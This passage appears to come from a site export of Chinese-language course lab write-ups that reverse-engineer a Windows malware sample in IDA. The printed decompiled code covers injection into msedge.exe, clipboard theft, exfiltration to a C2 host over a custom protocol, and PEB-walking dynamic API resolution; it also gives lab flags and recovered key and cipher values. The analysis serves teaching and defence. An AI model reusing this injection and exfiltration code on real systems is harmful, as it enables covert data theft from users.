getNtHdr(_QWORD)，就變得非常簡潔好看，另外，要把pe_file的type從_int64改成_QWORD的原因是pe_file存的是byte_140005040的地址，不是數字，雖然代表的byte數一樣，但意義不相同，所以IDA可能會解析不出來 最後就把目前的這個sub function rename成getEmbeddedPE_File就可以了 :::info ::: :::spoiler 解析後\n__int64 returnTargetPid() { DWORD LastError; // eax DWORD v2; // eax WCHAR *szExeFile; // rax signed __int64 v4; // rcx WCHAR v5; // dx int v6; // eax DWORD th32ProcessID; // [rsp+20h] [rbp-288h] HANDLE hSnapshot; // [rsp+28h] [rbp-280h] HANDLE hObject; // [rsp+30h] [rbp-278h] HANDLE CurrentProcess; // [rsp+38h] [rbp-270h] PSID pSid1; // [rsp+40h] [rbp-268h] BYREF PSID pSid2; // [rsp+48h] [rbp-260h] BYREF PROCESSENTRY32W pe; // [rsp+50h] [rbp-258h] BYREF hSnapshot = CreateToolhelp32Snapshot(2u, 0); if ( hSnapshot == (HANDLE)-1i64 ) { LastError = GetLastError(); sub_140001260(\u0026#34;CreateToolhelp32Snapshot failed with error %lu\\n\u0026#34;, LastError); return 0i64; } else { pe.dwSize = 568; if ( Process32FirstW(hSnapshot, \u0026amp;pe) ) { pSid2 = malloc(0x44ui64); CurrentProcess = GetCurrentProcess(); sub_140001500(CurrentProcess, \u0026amp;pSid2); th32ProcessID = 0; do { pSid1 = malloc(0x44ui64); hObject = OpenProcess(0x400u, 0, pe.th32ProcessID); if ( hObject ) { if ( (unsigned int)sub_140001500(hObject, \u0026amp;pSid1) ) { if ( EqualSid(pSid1, pSid2) ) { szExeFile = pe.szExeFile; v4 = (char *)L\u0026#34;msedge.exe\u0026#34; - (char *)pe.szExeFile; while ( 1 ) { v5 = *szExeFile; if ( *szExeFile != *(WCHAR *)((char *)szExeFile + v4) ) break; ++szExeFile; if ( !v5 ) { v6 = 0; goto LABEL_14; } } v6 = v5 \u0026lt; *(WCHAR *)((char *)szExeFile + v4) ? -1 : 1; LABEL_14: if ( !v6 ) th32ProcessID = pe.th32ProcessID; } free(pSid1); } CloseHandle(hObject); } } while ( !th32ProcessID \u0026amp;\u0026amp; Process32NextW(hSnapshot, \u0026amp;pe) ); free(pSid2); CloseHandle(hSnapshot); return th32ProcessID; } else { v2 = GetLastError(); sub_140001260(\u0026#34;Process32First failed with error %lu\\n\u0026#34;, v2); CloseHandle(hSnapshot); return 0i64; } } } ::: Flag: FLAG{462fe0007f86957f59824e113f78947c}\n"},{"id":410,"href":"/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x202023-lab---winmalware---extract-next-stage-payload---2/","title":"Simple Reverse - 0x20(2023 Lab - WinMalware - Extract Next Stage Payload - 2)","section":"Securities","content":" Simple Reverse - 0x20(2023 Lab - WinMalware - Extract Next Stage Payload - 2) # Background # CreateToolhelp32Snapshot Process32FirstW GetCurrentProcess OpenProcess EqualSid Process32NextW OpenProcessToken GetTokenInformation Source code # sub_1400016B0 :::spoiler IDA Source Code解析前 __int64 returnTargetPid() { DWORD LastError; // eax DWORD v2; // eax WCHAR *szExeFile; // rax signed __int64 v4; // rcx WCHAR v5; // dx int v6; // eax DWORD th32ProcessID; // [rsp+20h] [rbp-288h] HANDLE hSnapshot; // [rsp+28h] [rbp-280h] HANDLE hObject; // [rsp+30h] [rbp-278h] HANDLE CurrentProcess; // [rsp+38h] [rbp-270h] PSID pSid1; // [rsp+40h] [rbp-268h] BYREF PSID pSid2; // [rsp+48h] [rbp-260h] BYREF PROCESSENTRY32W pe; // [rsp+50h] [rbp-258h] BYREF hSnapshot = CreateToolhelp32Snapshot(2u, 0); if ( hSnapshot == (HANDLE)-1i64 ) { LastError = GetLastError(); sub_140001260(\u0026#34;CreateToolhelp32Snapshot failed with error %lu\\n\u0026#34;, LastError); return 0i64; } else { pe.dwSize = 568; if ( Process32FirstW(hSnapshot, \u0026amp;pe) ) { pSid2 = malloc(0x44ui64); CurrentProcess = GetCurrentProcess(); sub_140001500(CurrentProcess, \u0026amp;pSid2); th32ProcessID = 0; do { pSid1 = malloc(0x44ui64); hObject = OpenProcess(0x400u, 0, pe.th32ProcessID); if ( hObject ) { if ( (unsigned int)sub_140001500(hObject, \u0026amp;pSid1) ) { if ( EqualSid(pSid1, pSid2) ) { szExeFile = pe.szExeFile; v4 = (char *)L\u0026#34;msedge.exe\u0026#34; - (char *)pe.szExeFile; while ( 1 ) { v5 = *szExeFile; if ( *szExeFile != *(WCHAR *)((char *)szExeFile + v4) ) break; ++szExeFile; if ( !v5 ) { v6 = 0; goto LABEL_14; } } v6 = v5 \u0026lt; *(WCHAR *)((char *)szExeFile + v4) ? -1 : 1; LABEL_14: if ( !v6 ) th32ProcessID = pe.th32ProcessID; } free(pSid1); } CloseHandle(hObject); } } while ( !th32ProcessID \u0026amp;\u0026amp; Process32NextW(hSnapshot, \u0026amp;pe) ); free(pSid2); CloseHandle(hSnapshot); return th32ProcessID; } else { v2 = GetLastError(); sub_140001260(\u0026#34;Process32First failed with error %lu\\n\u0026#34;, v2); CloseHandle(hSnapshot); return 0i64; } } } ::: Recon # 首先，他先利用CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)把當前系統中所有的process都snapshot，並回傳指定快照集的開啟控制碼(handle)\n在MSDN中有提到\n若要列舉process，請參閱 Process32FirstW\n所以的確，該function底下就有使用到這個API(#27)，主要目的是擷取系統snapshot中所遇到的第一個process相關資訊\n接著進到sub_140001500中看一下，如果不看其他exception handler的話其實蠻簡單的\n也就是他會先取得currentProcess的token handle(暫時不需要知道handle是啥)，然後再取得儲存資料所需要的buffer size，這邊很tricky的地方是，在#14的地方原本是設定TokenInformationLength = 0，而後面呼叫的GetTokenInformation就一定會報錯，但他只是想知道TokenInformation的length為多少，所以當他執行完#15行之後，\u0026amp;TokenInformationLength會儲存Length，而我可以利用報錯error code(也就是0x7A, ERROR_INSUFFICIENT_BUFFER)，進到if statement中，然後利用得到的length再malloc一個空間，做後續的操作 再次呼叫GetTokenInformation 取得資料，此時因為我們已經明確知道需要多大的空間了，所以就不會再報錯了，此時才能真正的取得資料 將User SID 複製到a2這個變數 :::spoiler __int64 __fastcall sub_140001500(void *a1, PSID *a2) { DWORD v2; // eax DWORD v4; // eax DWORD v5; // eax DWORD LastError; // eax PSID *TokenInformation; // [rsp+30h] [rbp-28h] DWORD TokenInformationLength; // [rsp+38h] [rbp-20h] BYREF HANDLE TokenHandle; // [rsp+40h] [rbp-18h] BYREF TokenHandle = 0i64; if ( OpenProcessToken(a1, 0x20008u, \u0026amp;TokenHandle) ) { TokenInformationLength = 0; GetTokenInformation(TokenHandle, TokenUser, 0i64, 0, \u0026amp;TokenInformationLength); if ( GetLastError() == 122 ) { TokenInformation = (PSID *)malloc(TokenInformationLength); if ( TokenInformation ) { if ( GetTokenInformation( TokenHandle, TokenUser, TokenInformation, TokenInformationLength, \u0026amp;TokenInformationLength) ) { if ( CopySid(0x44u, *a2, *TokenInformation) ) { if ( !IsValidSid(*a2) ) sub_140001260(\u0026#34;Sid is invalid\\n\u0026#34;); free(TokenInformation); CloseHandle(TokenHandle); return 1i64; } else { LastError = GetLastError(); sub_140001260(\u0026#34;CopySid failed, %d\\n\u0026#34;, LastError); return 0i64; } } else { v5 = GetLastError(); sub_140001260(\u0026#34;GetTokenInformatoin failed, %d\\n\u0026#34;, v5); CloseHandle(TokenHandle); return 0i64; } } else { CloseHandle(TokenHandle); return 0i64; } } else { v4 = GetLastError(); sub_140001260(\u0026#34;GetTokenInformatoin 1 failed, %d\\n\u0026#34;, v4); CloseHandle(TokenHandle); return 0i64; } } else { v2 = GetLastError(); sub_140001260(\u0026#34;OpenProcessToken failed, %d\\n\u0026#34;, v2); return 0i64; } } :::\n回到sub_1400016B0，可以看到#33~#67是一個do_while loop，該loop就是把現在存取的process再打開(利用PID指定)，並取得他的handle，然後找到該process的User SID，再去比對前一個步驟取得的User SID和現在取得的User SID有沒有一樣，如果一樣就做==#43~#57==(其實就是memcmp(\u0026quot;msedge.exe\u0026quot;, process’s executable file name))，他會去比對目前的這一支程式的filename是不是msedge.exe，如果這個Edge Process的User SID和目前的current User SID一樣且memcmp也回傳是，就return PID\n:::info 簡略流程如下:\nsnapshot目前所有的process 取得目前執行這支程式(A)的User SID 遍歷snapshot中所有的process，如果遍歷的process(B)的User SID和剛剛取得的一樣就再memcmp，看目前的這支程式(B)是不是msedge.exe，如果是就回傳PID，若否就再遍歷下一個process(B\u0026rsquo;) ::: "},{"id":411,"href":"/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x212023-lab---winmalware---extract-next-stage-payload---3/","title":"Simple Reverse - 0x21(2023 Lab - WinMalware - Extract Next Stage Payload - 3)","section":"Securities","content":" Simple Reverse - 0x21(2023 Lab - WinMalware - Extract Next Stage Payload - 3) # Background # VirtualAllocEx 記憶體保護常數 WriteProcessMemory CreateRemoteThread Export Address Table(EAT) Source code # :::spoiler Source Code sub_140001A60\n__int64 __fastcall sub_140001A60(DWORD edge_pid, const void *pe_file, SIZE_T pe_file_size) { DWORD v4; // eax DWORD LastError; // eax HANDLE hProcess; // [rsp+40h] [rbp-38h] char *lpBaseAddress; // [rsp+48h] [rbp-30h] LPTHREAD_START_ROUTINE lpStartAddress; // [rsp+50h] [rbp-28h] __int64 v9; // [rsp+58h] [rbp-20h] BYREF DWORD ThreadId; // [rsp+60h] [rbp-18h] BYREF v9 = 0i64; sub_1400018F0(pe_file, \u0026amp;v9); if ( v9 ) { hProcess = OpenProcess(0x43Au, 0, edge_pid); if ( hProcess ) { lpBaseAddress = (char *)VirtualAllocEx(hProcess, 0i64, pe_file_size, 0x3000u, 0x40u); if ( WriteProcessMemory(hProcess, lpBaseAddress, pe_file, pe_file_size, 0i64) ) { lpStartAddress = (LPTHREAD_START_ROUTINE)\u0026amp;lpBaseAddress[v9]; CreateRemoteThread(hProcess, 0i64, 0i64, (LPTHREAD_START_ROUTINE)\u0026amp;lpBaseAddress[v9], 0i64, 0, \u0026amp;ThreadId); sub_140001260(\u0026#34;remote thread id: %lu, loader address: %p\u0026#34;, ThreadId, lpStartAddress); return 1i64; } else { LastError = GetLastError(); sub_140001260(\u0026#34;WriteProcessMemory failed, %lu\u0026#34;, LastError); return 0i64; } } else { v4 = GetLastError(); sub_140001260(\u0026#34;OpenProcess failed, %lu\u0026#34;, v4); return 0i64; } } else { sub_140001260(\u0026#34;get_reflectivce_loader_offset failed\\n\u0026#34;); return 0i64; } } :::\nRecon # 首先看到他open我們剛剛拿到的edge process 利用VirtualAllocEx這個API主要可以在指定的process中malloc一塊記憶體，他的大小取決於pe_file_size，而該記憶體配置的類型是MEM_COMMIT+MEM_RESERVE(暫時不用管是甚麼)，然後權限的話是設定0x40(PAGE_EXECUTE_READWRITE)，就是可寫可執行 #19的意思是說: 把pe_file的資料寫入lpBaseAddress的地方，總共寫入pe_file_size這麼多的大小 #22的意思是把儲存在(LPTHREAD_START_ROUTINE)\u0026amp;lpBaseAddress[v9]這邊的東西跑起來 $\\to$在 Edge process 中建立 thread，thread 執行起點為 lpBaseAddress[v9]\n:::info 目前為止的資訊 :::\n那甚麼是v9呢? 這個變數可以往回看#11~#12的地方，可以跟進去看\n首先，#18的地方很明顯就是在取得export table，因為他拿的地方是在optional header的data directory[0]，也就是export table。至於sub_140001410在幹嘛，簡單說就是把RVA轉回file offset的function #30~#46的地方就是像前一篇有講到的一樣，是memcmp(\u0026quot;my_start\u0026quot;, v13)，仔細比對前面提到的memcmp(\u0026quot;msedge.exe\u0026quot;, process’s executable file name)，結構幾乎一模一樣 有了第一部拿到的export table和第二步想要比對的\u0026quot;my_start\u0026quot;字串，通靈後可以想到他就是想要拿到名為my_start的DLL導出函數 至此，我們已經知道這一個function在做的事情就是去export table中找到my_start這個function後，回傳他的位址 :::spoiler sub_1400018F0 Source Code解析前 __int64 __fastcall sub_1400018F0(__int64 pe_file, __int64 *a2) { IMAGE_NT_HEADERS *NtHdr; // rax __int64 result; // rax __int64 v4; // rax unsigned __int8 *v5; // rax char *v6; // rcx unsigned __int8 v7; // dl int v8; // eax unsigned __int16 v9; // [rsp+20h] [rbp-38h] int i; // [rsp+24h] [rbp-34h] unsigned int *v11; // [rsp+28h] [rbp-30h] unsigned __int64 v12; // [rsp+30h] [rbp-28h] unsigned __int8 *v13; // [rsp+38h] [rbp-20h] __int64 v14; // [rsp+40h] [rbp-18h] NtHdr = getNtHdr(pe_file); v11 = (unsigned int *)(sub_140001410(pe_file, NtHdr-\u0026gt;OptionalHeader.DataDirectory[0].VirtualAddress) + pe_file); v12 = v11[6]; for ( i = 0; ; ++i ) { result = i; if ( i \u0026gt;= v12 ) break; v4 = sub_140001410(pe_file, v11[8]); v13 = (unsigned __int8 *)(sub_140001410(pe_file, *(unsigned int *)(v4 + pe_file + 4i64 * i)) + pe_file); v9 = *(_WORD *)(sub_140001410(pe_file, v11[9]) + pe_file + 2i64 * i); v14 = *(unsigned int *)(sub_140001410(pe_file, v11[7]) + pe_file + 4i64 * v9); v5 = v13; v6 = (char *)(\u0026#34;my_start\u0026#34; - (char *)v13); while ( 1 ) { v7 = *v5; if ( *v5 != v6[(_QWORD)v5] ) break; ++v5; if ( !v7 ) { v8 = 0; goto LABEL_8; } } v8 = v7 \u0026lt; (unsigned int)v6[(_QWORD)v5] ? -1 : 1; LABEL_8: if ( !v8 ) { result = sub_140001410(pe_file, v14); *a2 = result; return result; } } return result; } :::\n:::spoiler sub_1400018F0 Source Code解析前\nunsigned __int64 __fastcall getMy_Start_ExportFunction(__int64 pe_file, unsigned __int64 *my_start_address_offset) { IMAGE_NT_HEADERS *NtHdr; // rax unsigned __int64 result; // rax unsigned __int64 name_array; // rax unsigned __int8 *v5; // rax char *v6; // rcx unsigned __int8 v7; // dl int v8; // eax unsigned __int16 name_ordinal; // [rsp+20h] [rbp-38h] int i; // [rsp+24h] [rbp-34h] IMAGE_EXPORT_DIRECTORY *exportTable; // [rsp+28h] [rbp-30h] unsigned __int64 NumberOfNames; // [rsp+30h] [rbp-28h] unsigned __int8 *fn_name; // [rsp+38h] [rbp-20h] unsigned __int64 fn_addr; // [rsp+40h] [rbp-18h] NtHdr = getNtHdr(pe_file); exportTable = (rva2FileOffset(pe_file, NtHdr-\u0026gt;OptionalHeader.DataDirectory[0].VirtualAddress) + pe_file); NumberOfNames = exportTable-\u0026gt;NumberOfNames; for ( i = 0; ; ++i ) { result = i; if ( i \u0026gt;= NumberOfNames ) break; name_array = rva2FileOffset(pe_file, exportTable-\u0026gt;AddressOfNames); fn_name = (rva2FileOffset(pe_file, *(name_array + pe_file + 4i64 * i)) + pe_file); name_ordinal = *(rva2FileOffset(pe_file, exportTable-\u0026gt;AddressOfNameOrdinals) + pe_file + 2i64 * i); fn_addr = *(rva2FileOffset(pe_file, exportTable-\u0026gt;AddressOfFunctions) + pe_file + 4i64 * name_ordinal); v5 = fn_name; v6 = (\u0026#34;my_start\u0026#34; - fn_name); while ( 1 ) { v7 = *v5; if ( *v5 != v6[v5] ) break; ++v5; if ( !v7 ) { v8 = 0; goto LABEL_8; } } v8 = v7 \u0026lt; v6[v5] ? -1 : 1; LABEL_8: if ( !v8 ) { result = rva2FileOffset(pe_file, fn_addr); *my_start_address_offset = result; return result; } } return result; } :::\n小節 # 至此，我們已經把主要程式都分析完了，大略流程如下\n主要是後面的部分比較難分析，駭客主要的目的是把有問題的DLL file注入到msedge.exe這個process中並且建立一個thread，然後從my_start這個導出函數開始執行一些操作，這樣一個完整的流程就叫做==Process Injection==\n這樣繞一大圈的用途 # 不會建立獨立的 process，而是把惡意行為隱藏在正常 process 中，以躲避 process 級別的偵測 若能注入高權限 process，則有機會提權 防禦手法 # 常用 API：VirtualAllocEx、WriteProcessMemory、CreateRemoteThread 一般程式較少對其他 process 做寫入和建立 thread，使用這些 API 十分容易被偵測 "},{"id":412,"href":"/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x222023-lab---winmalware---collect/","title":"Simple Reverse - 0x22(2023 Lab - WinMalware - Collect)","section":"Securities","content":" Simple Reverse - 0x22(2023 Lab - WinMalware - Collect) # Background # 如果想要分析DLL，可以從以下三個地方切入\n_DllMainCRTStartup (DLL 載入和移除時的初始化與收尾) DllMain / DllEntryPoint / CRT_INIT (function signature 相同) 找有三個參數的 function call 範例就大概像這樣，從_DllMainCRTStartup底下有call _CRT_INIT和call DllEntryPoint(DllMain在比較下面) Exported Functions TLS Callback OpenClipboard GetClipboardData globalLock _itoa Source Code # IDA解析的source code很常會出現明明沒有return value但還是自動建立的狀況，所以適時的刪除return value(Shift+DEL)是對分析比較好的做法\nDllMain BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) { if ( fdwReason == 1 ) { MessageBoxA(0i64, \u0026#34;Reflective Dll Injection success. Remember to delete the persistence file\u0026#34;, \u0026#34;eductf-lab\u0026#34;, 0); my_main(); // 不重要的東西 collect_and_exfiltrate(); } return 1; } collect_and_exfiltrate void collect_and_exfiltrate(void) { PUCHAR pbInput; // [rsp+28h] [rbp-10h] BYREF pbInput = 0i64; collect_data(\u0026amp;pbInput); exfiltrate(pbInput); } collect_data void __fastcall collect_data(char **pbInput) { char *pbInput_1; // [rsp+28h] [rbp-10h] BYREF collect_get_clipboard_data(\u0026amp;pbInput_1); *pbInput = pbInput_1; } collect_get_clipboard_data void __fastcall collect_get_clipboard_data(LPVOID *pbInput) { HANDLE ClipboardData; // rax void *v3; // rsi int LastError; // eax char Buffer[34]; // [rsp+26h] [rbp-22h] BYREF if ( OpenClipboard(0i64) ) { ClipboardData = GetClipboardData(1u); v3 = ClipboardData; if ( ClipboardData ) { *pbInput = GlobalLock(ClipboardData); GlobalUnlock(v3); } else { LastError = GetLastError(); _itoa(LastError, Buffer, 10); } } CloseClipboard(); } Recon # 目前要分析的重點著重在DllMain中，所以其他的切入點可以先不管，並且先聚焦在collect data身上。其實作者一開始就有把debug information都放在這邊，所以分析可以更順暢\n首先trace一下上面所有的code，會發現其實簡單到根本不用查MSDN也知道在幹嘛，就是把受害主機的剪貼簿打開，並取得這個剪貼簿的開頭指標，再回傳給pbIntput 最後再傳給後續的exfiltrate function :::info 目前的攻擊手法符合Mitre ATT\u0026amp;CK的T1115，剪貼簿中可能剛好有帳號、密碼、信用卡號之類的 除了剪貼簿，還能收集很多其他東西，像是：\nPDF、DOCX、XLSX、Email、Git source code SSH private key、Key logging、OS credential cache 麥克風、鏡頭、其他外接裝置 任何你想得到的資訊 ::: "},{"id":413,"href":"/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x232023-lab---winmalware---exfiltrate/","title":"Simple Reverse - 0x23(2023 Lab - WinMalware - Exfiltrate)","section":"Securities","content":" Simple Reverse - 0x23(2023 Lab - WinMalware - Exfiltrate) # Description # 請根據 next stage payload 的行為，分析 capture.pcapng 中的封包，找出並解密被滲出/傳送到 C2 server 的資料。\nBackground # WSAStartup htons socket sockaddr WSAConnect Source Code # exfiltrate :::spoiler source void __fastcall exfiltrate(PUCHAR pbInput) { __int64 s[2]; // [rsp+28h] [rbp-10h] BYREF connect_to_c2(s); send_collected_data_to_c2(s[0], pbInput); shutdown(s[0], 1); closesocket(s[0]); } ::: connect_to_c2 :::spoiler source void __fastcall connect_to_c2(unsigned __int64 *a1) { unsigned __int64 v2; // rax struct sockaddr name; // [rsp+20h] [rbp-1B8h] BYREF struct WSAData WSAData; // [rsp+30h] [rbp-1A8h] BYREF if ( !WSAStartup(0x202u, \u0026amp;WSAData) ) { *\u0026amp;name.sa_data[2] = 168470720; *name.sa_data = htons(0x2BB3u); name.sa_family = 2; v2 = socket(2, 1, 6); *a1 = v2; connect(v2, \u0026amp;name, 16); } } ::: send_collected_data_to_c2 :::spoiler source void __fastcall send_collected_data_to_c2(SOCKET s, PUCHAR pbInput) { char *v4; // rbx int v5; // esi int i; // eax char v7; // al int j; // ecx int v9; // eax v4 = malloc(0x4Cui64); *v4 = 0x11877811; *(v4 + 1) = 4; *(v4 + 2) = 0; if ( send(s, v4, 76, 0) \u0026gt; 0xB ) { v5 = 0; while ( v5 \u0026lt;= 2 ) { if ( recv(s, v4, 76, 0) \u0026gt; 0xB \u0026amp;\u0026amp; *v4 == 0x11877811 ) { v9 = *(v4 + 2); if ( v9 ) { switch ( v9 ) { case 1: *v4 = 0x11877811; *(v4 + 1) = 4; *(v4 + 2) = 1; encrypt_key = (v4 + 12); encrypt_data(pbInput); for ( i = 2; i \u0026lt;= 23; ++i ) v4[i + 12] += v4[i + 11] - v4[i + 10]; break; case 2: *v4 = 0x11877811; *(v4 + 1) = 28; *(v4 + 2) = 2; memcpy_s(v4 + 12, 0x18ui64, cipher, 0x18ui64); break; case 3: goto LABEL_20; } } else { *v4 = 0x11877811; *(v4 + 1) = 4; *(v4 + 2) = 0; } for ( j = 0; j \u0026lt;= 39; ++j ) { v7 = v4[j + 36] + v4[43] + v4[49] - v4[67]; v4[j + 36] = v7; v4[j + 36] = v4[54] - (v4[61] + v4[69]) + v7; } send(s, v4, 76, 0); ++v5; } } LABEL_20: free(v4); } } ::: Recon # connet_to_c2 目標是取得c2 server的IP和port number\n先看到#12的socket function，他代表的意思是利用IPv4並且TCP的protocol進行溝通，相關的數值說明都在MSDN，可以用前面教到的用m指令改變已知的constant名稱$\\to$v2 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 接著看到connect function中的\u0026amp;name，IDA原本解析成sockaddr，sockaddr是一種通用的結構格式，所以IDA解析出來的東西也沒有問題，不過如果是IPv4又是乙太網路的傳輸，會比較建議把結構改成==sockaddr_in==，這一篇探討了兩者的區別(其實就只是把sockaddr原本的結構擴展而已)，這樣的話整體分析會更好 :::spoiler 解析後 void __fastcall connect_to_c2(unsigned __int64 *a1) { unsigned __int64 v2; // rax struct sockaddr_in name; // [rsp+20h] [rbp-1B8h] BYREF struct WSAData WSAData; // [rsp+30h] [rbp-1A8h] BYREF if ( !WSAStartup(0x202u, \u0026amp;WSAData) ) { name.sin_addr.S_un.S_addr = 0xA0AA8C0; // IP: 192.168.10.10 name.sin_port = htons(11187u); // Port No.: 11187 name.sin_family = AF_INET; v2 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); *a1 = v2; connect(v2, \u0026amp;name, 16); } } ::: :::info IP: 0xA0AA8C0 $\\to$ 192.168.10.10(little endian轉十進位) Port: 11187 sin.family: IPv4 Protocol: TCP ::: send_collected_data_to_c2\n先切分程式碼的功能 有時候通靈不一定很準，所以要適時的回頭檢查自己的猜測 前四行初始化的階段(malloc 0x4c然後塞三個dword)，應該是作者自定義的結構，可以利用Structures，自定義一個新的結構，大小就是0x4C，然後前三個可以定義為dd，並且把v4的結構改成packet(按Y) 各種rename field_0看起來像是一個magic bytes，因為一開始附值之後，傳送過去server，再接收回來的packet也是有做驗證的動作，所以看起來是一個verification magic field_8看起來就是接收來自server下達的command field_C就比較多元，在case 1的時候是當作承接server給的encryption key(大小是8個bytes)，但在case 2是當作加密的cipher(大小是0x18個bytes)，所以我取名enc_key_or_data，另外大小是0x18(可以從memcpy的大小看出來)，所以可以按Y改變型別成char[0x18] :::info 目前整體的流程 ::: 分析pcap 這一部就直接對照著講義上截圖或是剛剛分析的封包格式就可以知道哪一個是key哪一個是cipher Key: f0 c7 d3 0e 7f 2c 15 ba Cipher: 43 60 5b 5f 4e ba 9f 9e e3 78 6f 55 cb 81 24 fa e7 bf 0d 1b 3c 24 b7 4e 接下來就可以直接用cipherchef的線上功能decrypt其中的內容 :::success Flag: FLAG{C2_cU540m_Pr0t0C01} :::\n"},{"id":414,"href":"/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x242023-lab---winmalware---dynamic-api-resolution-background/","title":"Simple Reverse - 0x24(2023 Lab - WinMalware - Dynamic API Resolution Background)","section":"Securities","content":" Simple Reverse - 0x24(2023 Lab - WinMalware - Dynamic API Resolution Background) # Background # Process Environment Block (PEB) 紀錄許多 Process 相關資訊的 OS 資料結構 存在於 user land x86 環境下，可以從 fs:[0x30] 取得 x64 環境下，可以從 gs:[0x60] 取得 ==0x18: Ldr== 指向 _PEB_LDR_DATA 結構 _PEB (注意 x64 和 x86 結構不同) _PEB_LDR_DATA 紀錄 Process 中載入模組的相關資訊 模組 module：PE 或 DLL ==0x10: InLoadOrderModuleList== 指向 _LDR_DATA_TABLE_ENTRY 依載入順序串起的雙向 linked list _PEB_LDR_DATA _LDR_DATA_TABLE_ENTRY 紀錄一個載入模組的相關資訊 ==0x00: InLoadOrderModuleList== 依載入順序串起的雙向 linked list Flink：指向下一個 entry ==0x30: DllBase== 此載入模組的 ImageBase ==0x58: BaseDllName== 此載入模組的檔案名稱 _LDR_DATA_TABLE_ENTRY Exploit # Defense Evasion — Dynamic API Resolution 用途: 駭客常用的手法往往倚賴特定的 API 來達成，例如：Injection = VirtualAllocEx + WriteProcessMemory + CreateRemoteThread，因此資安產品只要監控這些 API，就很容易偵測到惡意行為 Shellcode 沒有 loader 幫你把 API 連結起來\n目的: 不靠 loader，在 runtime 自行爬取系統結構，取得所需的 Windows API(其實就有點像是打pwn的時候會看glibc有沒有import其他library的感覺一樣，如果有就可以用一些方法把它拿來用，像是leak一些資訊或是拿到shell之類的) 困難的地方：要達成這個條件就需要有==system dll==的export address table，而system dll在哪裡呢?就是在process的memory中，所以我們只要拿到該dll的imagebase就可以直接拿到我們想要的API 如何達成?完全就是利用前面background提到的PEB結構慢慢parse，最後就可以parse到想要的dll，簡單來說就是，先找到PEB，在0x18的地方抓到_PEB_LDR_DATA的RVA，再從該表的0x10抓到目前已經載入的DLL或PE的地址，並且比對現在我們想要的DLL是不是目前抓到的DLL table(就是從該表的BaseDllName去比對名稱)，如果不是就繼續往下搜尋；如果是，就利用DllBase儲存的ImageBase抓到他在process中的地址 Source Code # :::spoiler IDA Source Code(解析後的版本)\n__int64 my_start() { // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-\u0026#34;+\u0026#34; TO EXPAND] for ( i = \u0026amp;loc_20281179F; *i != \u0026#39;ZM\u0026#39; || getNtHdrs(i)-\u0026gt;OptionalHeader.Magic != 0x20B; i = (i - 1) ) ; p_InLoadOrderModuleList = \u0026amp;NtCurrentPeb()-\u0026gt;Ldr-\u0026gt;InLoadOrderModuleList; for ( j = p_InLoadOrderModuleList; j-\u0026gt;InLoadOrderLinks.Flink != p_InLoadOrderModuleList; j = j-\u0026gt;InLoadOrderLinks.Flink ) { dll_name = j-\u0026gt;BaseDllName.Buffer; dll_base = j-\u0026gt;DllBase; if ( dll_name ) { dll_name_1 = *dll_name; if ( (*dll_name == \u0026#39;k\u0026#39; || dll_name_1 == \u0026#39;K\u0026#39;)// find \u0026#34;kernel32.dll\u0026#34; from BaseDllName \u0026amp;\u0026amp; ((v3 = *(dll_name + 1), v3 == \u0026#39;e\u0026#39;) || v3 == \u0026#39;E\u0026#39;) \u0026amp;\u0026amp; ((v4 = *(dll_name + 2), v4 == \u0026#39;r\u0026#39;) || v4 == \u0026#39;R\u0026#39;) \u0026amp;\u0026amp; ((v5 = *(dll_name + 3), v5 == \u0026#39;n\u0026#39;) || v5 == \u0026#39;N\u0026#39;) \u0026amp;\u0026amp; ((v6 = *(dll_name + 4), v6 == \u0026#39;e\u0026#39;) || v6 == \u0026#39;E\u0026#39;) \u0026amp;\u0026amp; ((v7 = *(dll_name + 5), v7 == \u0026#39;l\u0026#39;) || v7 == \u0026#39;L\u0026#39;) \u0026amp;\u0026amp; *(dll_name + 6) == \u0026#39;3\u0026#39; \u0026amp;\u0026amp; *(dll_name + 7) == \u0026#39;2\u0026#39; ) { exportTable = (dll_base + getNtHdrs(j-\u0026gt;DllBase)-\u0026gt;OptionalHeader.DataDirectory[0].VirtualAddress);// get kernel32.dll\u0026#39;s Export Address Table num_of_names = exportTable-\u0026gt;NumberOfNames; name_array = (dll_base + exportTable-\u0026gt;AddressOfNames); name_ordinal = (dll_base + exportTable-\u0026gt;AddressOfNameOrdinals); func_array = (dll_base + exportTable-\u0026gt;AddressOfFunctions); for ( k = 0i64; k \u0026lt; num_of_names; ++k ) { api_name = dll_base + name_array[k]; hash = 0; do hash += __ROL4__(hash, 11) + 1187 + *api_name++;// do self-defined hash function while ( *api_name ); switch ( hash ) { case 0x5F00766C: v59 = dll_base + func_array[name_ordinal[k]]; break; case 0x6D555364: v60 = dll_base + func_array[name_ordinal[k]]; break; case 0x42B4FA0: v61 = dll_base + func_array[name_ordinal[k]]; break; case 0xC473C85A: v64 = dll_base + func_array[name_ordinal[k]]; break; } } } else if ( (dll_name_1 == \u0026#39;m\u0026#39; || dll_name_1 == \u0026#39;M\u0026#39;) \u0026amp;\u0026amp; ((v16 = *(dll_name + 1), v16 == \u0026#39;s\u0026#39;) || v16 == \u0026#39;S\u0026#39;) \u0026amp;\u0026amp; ((v17 = *(dll_name + 2), v17 == \u0026#39;v\u0026#39;) || v17 == \u0026#39;V\u0026#39;) \u0026amp;\u0026amp; ((v18 = *(dll_name + 3), v18 == \u0026#39;c\u0026#39;) || v18 == \u0026#39;C\u0026#39;) \u0026amp;\u0026amp; ((v19 = *(dll_name + 4), v19 == \u0026#39;r\u0026#39;) || v19 == \u0026#39;R\u0026#39;) \u0026amp;\u0026amp; ((v20 = *(dll_name + 5), v20 == \u0026#39;t\u0026#39;) || v20 == \u0026#39;T\u0026#39;) ) { exportTable_1 = (dll_base + getNtHdrs(j-\u0026gt;DllBase)-\u0026gt;OptionalHeader.DataDirectory[0].VirtualAddress); num_of_names_1 = exportTable_1-\u0026gt;NumberOfNames; name_array_1 = (dll_base + exportTable_1-\u0026gt;AddressOfNames); name_ordinal_1 = (dll_base + exportTable_1-\u0026gt;AddressOfNameOrdinals); func_array_1 = (dll_base + 